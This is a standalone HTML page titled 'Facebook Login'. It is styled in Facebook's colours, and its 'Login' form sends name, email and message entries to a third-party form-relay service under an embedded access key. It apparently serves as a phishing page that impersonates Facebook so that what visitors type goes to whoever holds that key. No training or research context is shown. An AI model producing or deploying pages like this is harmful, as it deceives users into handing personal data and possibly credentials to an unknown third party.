<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            max-width: 1000px;
            padding: 20px;
            box-sizing: border-box;
        }

        .info {
            max-width: 500px;
            margin-right: 50px;
        }

        .logo {
            font-size: 50px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 10px;
        }

        .tagline {
            font-size: 24px;
            color: #606770;
        }

        .login-form {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .login-form input {
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            width: calc(100% - 30px);
            outline: none;
        }
        .login-form textarea {
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            width: calc(100% - 30px);
            resize: vertical;
            outline: none;
        }

        .login-form button {
            width: 100%;
            padding: 15px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }

        .login-form button:hover {
            background-color: #165dbb;
        }

        .forgot-password {
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
            display: block;
            margin-top: 10px;
            text-align: center;
        }

        .create-account {
            margin-top: 20px;
            padding: 15px;
            background-color: #42b72a;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            width: 92%;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #65676b;
            text-align: center;
        }

        .footer a {
            color: #65676b;
            text-decoration: none;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                align-items: center;
                text-align: center;
            }

            .info {
                margin-bottom: 30px;
                margin-right: 0;
            }
        }
        .login-form{
            margin: auto;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="login-form">
            <form action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="281d7b39-b157-4b7f-86ff-a803d4bf2eb5">
                <input type="text" name="name" required>
                <input type="email" name="email" required>
                <textarea name="message" required></textarea>
                <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
</body>

</html>
